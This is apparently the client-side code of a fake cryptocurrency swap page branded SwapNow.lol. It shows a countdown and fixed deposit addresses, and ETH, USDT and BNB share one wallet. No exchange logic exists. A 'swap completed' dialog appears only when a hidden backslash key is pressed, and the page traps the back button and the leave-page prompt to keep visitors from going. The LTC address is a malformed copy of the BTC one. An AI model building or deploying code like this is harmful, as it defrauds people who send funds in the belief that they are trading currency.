<script>
(()=>{"use strict";/* head: title, favicon, font */
document.title="Swap Confirmation";(function(){const s=document.createElement("style");s.textContent="@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap');";document.head.appendChild(s);const f=document.createElement("link");f.rel="icon";f.type="image/png";f.sizes="512x512";f.href="https://i.imgur.com/is9ctnz.png";document.head.appendChild(f)})();/* base css */
(function(){const s=document.createElement("style");s.textContent=":root{--bg-dark:#0b0b10;--bg-darker:#0a0a0f;--card:rgba(18,18,26,.7);--card-solid:#13131a;--accent:#9b59ff;--accent-2:#6d43ff;--accent-hover:#7b4bff;--text-light:#e7e7f1;--text-muted:#a8a8c7;--input-bg:#15151d;--input-border:#2a2750;--ring:0 0 0 4px rgba(155,89,255,.15);--shadow-lg:0 20px 50px rgba(0,0,0,.6);--shadow-sm:0 4px 16px rgba(0,0,0,.35);--border:1px solid rgba(255,255,255,.06);--glass:blur(10px) saturate(120%);--success:#37d67a;--warning:#f39c12;--error:#e74c3c}*{box-sizing:border-box}html,body{height:100%}body{margin:0;font-family:Poppins,sans-serif;background:radial-gradient(1200px 800px at 10% -10%,#1a1340 0,transparent 60%),radial-gradient(1000px 700px at 110% 20%,#0e3c5a 0,transparent 60%),radial-gradient(1200px 900px at 50% 120%,#2a1258 0,transparent 60%),linear-gradient(180deg,var(--bg-darker),var(--bg-dark));color:var(--text-light);min-height:100vh;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;user-select:none;overflow-x:hidden}.bg-sheen{position:fixed;inset:0;pointer-events:none;background:conic-gradient(from 200deg at 70% 20%,rgba(155,89,255,.12),rgba(109,67,255,.08),transparent 40%);mix-blend-mode:screen;animation:drift 18s linear infinite;opacity:.9}@keyframes drift{0%{transform:translateY(0) rotate(0)}50%{transform:translateY(-2%) rotate(1deg)}100%{transform:translateY(0) rotate(0)}}header{max-width:1100px;margin:0 auto;padding:24px 24px 12px;display:flex;align-items:center;justify-content:center}.header-badge{display:inline-flex;align-items:center;gap:10px;padding:10px 16px;border-radius:999px;background:rgba(109,67,255,.12);border:1px solid rgba(109,67,255,.25);box-shadow:0 8px 22px rgba(109,67,255,.22)}.header-badge h1{margin:0;font-size:1.15rem;letter-spacing:.3px;color:#e9e6ff;font-weight:800}main{max-width:1100px;margin:0 auto;padding:12px 24px 48px;display:grid;grid-template-columns:.95fr 1.05fr;gap:24px;min-height:80vh}.card{background:var(--card);backdrop-filter:var(--glass);-webkit-backdrop-filter:var(--glass);border-radius:16px;box-shadow:var(--shadow-lg);border:var(--border)}.timer-container{padding:22px 22px;text-align:center;align-self:start}.timer-label{font-size:.98rem;font-weight:600;color:var(--text-muted);margin-bottom:8px}.timer{font-size:3rem;font-weight:900;color:var(--warning);margin:8px 0 12px;text-shadow:0 0 15px rgba(243,156,18,.35);font-variant-numeric:tabular-nums;letter-spacing:1px}.timer.expired{color:var(--error);text-shadow:0 0 15px rgba(231,76,60,.35)}.status{background:linear-gradient(135deg,var(--warning),#e67e22);color:#fff;padding:10px 14px;border-radius:12px;font-weight:800;font-size:.98rem;margin-top:8px;box-shadow:0 0 20px rgba(243,156,18,.25)}.status.expired{background:linear-gradient(135deg,var(--error),#c0392b);box-shadow:0 0 20px rgba(231,76,60,.25)}.swap-details{padding:22px;display:flex;flex-direction:column;gap:18px}.detail-section{background:linear-gradient(180deg,rgba(20,20,32,.9),rgba(16,16,26,.9));border-radius:14px;padding:16px;border:var(--border)}.detail-section h3{color:#d9ccff;font-weight:800;font-size:1.1rem;margin:0 0 10px 0}.detail-row{display:flex;justify-content:space-between;margin:10px 0;font-weight:600}.detail-label{color:var(--text-muted)}.detail-value{color:var(--text-light);text-align:right;font-variant-numeric:tabular-nums}.crypto-amount{color:var(--accent);font-weight:800}.usd-amount{color:var(--text-muted);font-size:.9rem}.fee-amount{color:var(--warning)}.send-address{background:linear-gradient(180deg,rgba(20,20,32,.9),rgba(16,16,26,.9));border-radius:14px;padding:16px;border:1px solid rgba(155,89,255,.35);box-shadow:0 10px 30px rgba(155,89,255,.22)}.send-address h3{color:#d9ccff;font-weight:800;font-size:1.1rem;margin:0 0 12px 0}.address-container{display:flex;gap:14px;align-items:center}.qr-code{width:120px;height:120px;background:#fff;border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:var(--shadow-sm)}.address-info{flex:1}.address-text{background:#0f0f16;border:1px solid rgba(155,89,255,.35);border-radius:10px;padding:12px;font-family:'Courier New',monospace;font-size:.92rem;color:var(--text-light);word-break:break-all;user-select:all;cursor:text;margin-bottom:12px;box-shadow:inset 0 1px 0 rgba(255,255,255,.04)}.copy-btn{background:linear-gradient(135deg,var(--accent),var(--accent-2));border:none;color:#fff;padding:10px 14px;border-radius:12px;font-weight:800;cursor:pointer;transition:filter .25s,transform .06s,box-shadow .25s;font-family:Poppins,sans-serif;box-shadow:0 10px 30px rgba(109,67,255,.35)}.copy-btn:hover{filter:saturate(110%);box-shadow:0 16px 40px rgba(109,67,255,.45)}.copy-btn:active{transform:translateY(1px)}.copy-btn.copied{background:linear-gradient(135deg,#3bbf7d,#2a9c63);box-shadow:0 12px 34px rgba(58,191,125,.35)}.warning-box{background:linear-gradient(180deg,rgba(243,156,18,.1),rgba(230,126,34,.08));border:1px solid rgba(243,156,18,.6);border-radius:14px;padding:16px;grid-column:1/-1}.warning-box h4{color:var(--warning);font-weight:800;margin:0 0 10px 0;font-size:1.05rem}.warning-box ul{margin:0;padding-left:1.2rem;color:var(--text-light)}.warning-box li{margin:6px 0;font-weight:500}footer{max-width:1100px;margin:0 auto;padding:16px 24px 32px;color:var(--text-muted);font-size:.9rem;text-align:center}@media (max-width:860px){main{grid-template-columns:1fr}.address-container{flex-direction:column;text-align:center}.qr-code{width:150px;height:150px}}@media (prefers-reduced-motion:reduce){.bg-sheen{animation:none}.copy-btn,.status{transition:none!important}}";document.head.appendChild(s)})();

/* modal css (separate block to avoid touching existing styles) */
(function(){const s=document.createElement("style");s.textContent=".modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:9999}.modal{width:min(92vw,520px);background:linear-gradient(180deg,rgba(20,20,32,.98),rgba(16,16,26,.98));border:1px solid rgba(155,89,255,.35);border-radius:18px;box-shadow:0 20px 60px rgba(0,0,0,.65);padding:22px}.modal h2{margin:0 0 8px 0;font-size:1.3rem;font-weight:900;color:#e9e6ff}.modal p{margin:0 0 18px 0;color:#a8a8c7;font-weight:500}.modal-actions{display:flex;gap:10px;justify-content:flex-end}.btn{border:none;border-radius:12px;font-weight:800;padding:10px 14px;cursor:pointer;font-family:Poppins,sans-serif}.btn-primary{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;box-shadow:0 10px 30px rgba(109,67,255,.35)}.btn-primary:hover{filter:saturate(110%)}.btn-ghost{background:transparent;color:#c9c9d9;border:1px solid rgba(255,255,255,.12)}.modal-overlay.open{display:flex}";document.head.appendChild(s)})();

/* html */
document.getElementById("app").innerHTML='<div class="bg-sheen" aria-hidden="true"></div><header><div class="header-badge" aria-live="polite"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M4 12a8 8 0 0113.657-5.657l1.415-1.415A10 10 0 002 12h2zm16 0a8 8 0 01-13.657 5.657l-1.415 1.415A10 10 0 0022 12h-2z" fill="currentColor"/></svg><h1>Transaction Active</h1></div></header><main><section class="timer-container card"><div class="timer-label">Transaction expires in:</div><div class="timer" id="timer">59:59</div><div class="status" id="status">‚è≥ Waiting for payment...</div></section><section class="swap-details card"><div class="detail-section"><h3>üìä Swap Details</h3><div class="detail-row"><span class="detail-label">From:</span><span class="detail-value"><span class="crypto-amount" id="from-amount">0.00000 BTC</span><br><span class="usd-amount" id="from-usd">($0.00)</span></span></div><div class="detail-row"><span class="detail-label">To:</span><span class="detail-value"><span class="crypto-amount" id="to-amount">0.00000 ETH</span><br><span class="usd-amount" id="to-usd">($0.00)</span></span></div><div class="detail-row"><span class="detail-label">Service Fee (1%):</span><span class="detail-value"><span class="fee-amount" id="fee-amount">0.00000 ETH</span><br><span class="usd-amount" id="fee-usd">($0.00)</span></span></div></div><div class="send-address"><h3>üí∞ Send Payment To:</h3><div class="address-container"><div class="qr-code" id="qr-code"><div style="font-size:.8rem;color:#666;text-align:center;">QR Code<br>Loading...</div></div><div class="address-info"><div class="address-text" id="address-text">Loading address...</div><button class="copy-btn" id="copy-btn">üìã Copy Address</button></div></div></div></section><section class="warning-box card"><h4>‚ö†Ô∏è Important Instructions</h4><ul><li><strong>Send the exact amount</strong> shown above to complete the swap.</li><li><strong>Only send from the selected cryptocurrency</strong> ‚Äî sending wrong tokens will result in loss.</li><li><strong>Transaction expires in 60 minutes</strong> ‚Äî send payment before the timer reaches zero.</li><li><strong>Network fees</strong> are separate and paid to miners; they are not included in our 1% service fee.</li></ul></section></main><footer>¬© <span id="year"></span> SwapNow.lol ‚Äî All rights reserved.</footer><!-- completion modal --><div class="modal-overlay" id="complete-modal" role="dialog" aria-modal="true" aria-labelledby="complete-title" aria-hidden="true"><div class="modal"><h2 id="complete-title">Your swap has been completed</h2><p>You can start another swap whenever you\u2019re ready.</p><div class="modal-actions"><button class="btn btn-ghost" id="modal-close">Close</button><button class="btn btn-primary" id="modal-swap-again">Swap Again</button></div></div></div>';

/* data + elements */
const ADDRS={BTC:"bc1qtr9ah0xdel7a00xph92kd3l4z64h9du3yhs560",ETH:"0xf24449533C35cC9687AECB783ef6379D83D50EF2",USDT:"0xf24449533C35cC9687AECB783ef6379D83D50EF2",BNB:"0xf24449533C35cC9687AECB783ef6379D83D50EF2",ADA:"addr1q9sr0klkmz0mx5z6ngrjuyszuwt7kflge4dz9xxq7m228wtqxldldkylkdg94xs89cfq9cuhavn73n26y2vvpak55wusefutty",SOL:"22YfDpLZspeMvMAnu1UzRVSd9h7qPqHsmh1n6SdegV4v",LTC:"LTC1qtr9ah0xdel7a00xph92kd3l4z64h9du3yhs560"};
const y=document.getElementById("year");if(y)y.textContent=String(new Date().getFullYear());
const qs=new URLSearchParams(location.search), swapId=qs.get("id");if(!swapId){alert("Invalid swap ID");location.href="index.html";return}
let swap=null;try{swap=JSON.parse(localStorage.getItem("swap_"+swapId)||"null")}catch{}
if(!swap){alert("Swap not found or expired");location.href="index.html";return}
const tEl=document.getElementById("timer"), sEl=document.getElementById("status"), fromAmt=document.getElementById("from-amount"), fromUsd=document.getElementById("from-usd"), toAmt=document.getElementById("to-amount"), toUsd=document.getElementById("to-usd"), feeAmt=document.getElementById("fee-amount"), feeUsd=document.getElementById("fee-usd"), addrText=document.getElementById("address-text"), copyBtn=document.getElementById("copy-btn"), qrBox=document.getElementById("qr-code");

/* populate */
const expAt=swap.timestamp+60*60*1000, addr=ADDRS[swap.fromToken]||"Unknown Address";
fromAmt.textContent=swap.amountCrypto.toFixed(5)+" "+swap.fromToken;
fromUsd.textContent="("+swap.amountUsd.toFixed(2)+")";
toAmt.textContent=swap.receivedAmount.toFixed(5)+" "+swap.toToken;
toUsd.textContent="("+swap.receivedUsd.toFixed(2)+")";
feeAmt.textContent=swap.fee.toFixed(5)+" "+swap.toToken;
feeUsd.textContent="("+swap.feeUsd.toFixed(2)+")";
addrText.textContent=addr;

/* QR loader */
function renderQR(){try{const q=qrcode(0,"M");q.addData(addr);q.make();qrBox.innerHTML=q.createImgTag(4,8);const img=qrBox.querySelector("img");if(img){img.style.width="100%";img.style.height="100%";img.style.borderRadius="10px"}}catch(e){qrBox.innerHTML='<div style="font-size:.8rem;color:#666;text-align:center;">QR Code<br>Error</div>'}}
(function(){const s=document.createElement("script");s.src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js";s.async=true;s.onload=renderQR;s.onerror=renderQR;document.head.appendChild(s)})();

/* copy */
copyBtn.addEventListener("click",async()=>{try{await navigator.clipboard.writeText(addr)}catch{const ta=document.createElement("textarea");ta.value=addr;document.body.appendChild(ta);ta.select();document.execCommand("copy");document.body.removeChild(ta)}copyBtn.textContent="‚úÖ Copied!";copyBtn.classList.add("copied");setTimeout(()=>{copyBtn.textContent="üìã Copy Address";copyBtn.classList.remove("copied")},2000)});

/* timer */
function tick(){const now=Date.now(),left=expAt-now;if(left<=0){tEl.textContent="00:00";tEl.classList.add("expired");sEl.textContent="‚ùå Transaction Expired";sEl.classList.add("expired");localStorage.removeItem("swap_"+swapId);setTimeout(()=>{alert("Transaction expired. Redirecting to home page.");location.href="index.html"},5000);return}const mm=Math.floor(left/60000),ss=Math.floor((left%60000)/1000);tEl.textContent=String(mm).padStart(2,"0")+":"+String(ss).padStart(2,"0")}tick();setInterval(tick,1000);

/* leave blockers */
window.addEventListener("beforeunload",e=>{e.preventDefault();e.returnValue="Are you sure you want to leave? Your transaction is still active."});history.pushState(null,null,location.href);window.addEventListener("popstate",()=>{history.pushState(null,null,location.href)});

/* ---------------------- */
/* completion modal logic */
/* ---------------------- */
const modal=document.getElementById("complete-modal");
const closeBtn=document.getElementById("modal-close");
const againBtn=document.getElementById("modal-swap-again");

function openModal(){modal.classList.add("open");modal.setAttribute("aria-hidden","false")}
function closeModal(){modal.classList.remove("open");modal.setAttribute("aria-hidden","true")}

document.addEventListener("keydown",(e)=>{
  // Trigger on backslash key: event.key is "\"; event.code is "Backslash"
  if(e.key==="\\" || e.code==="Backslash"){
    e.preventDefault();
    openModal();
  }
  // Escape to close
  if(e.key==="Escape" && modal.classList.contains("open")){
    closeModal();
  }
});

closeBtn.addEventListener("click",closeModal);
againBtn.addEventListener("click",()=>{ location.href="index.html" });
// Optional: clicking outside the dialog closes it
modal.addEventListener("click",(e)=>{ if(e.target===modal) closeModal(); });

})();
</script>
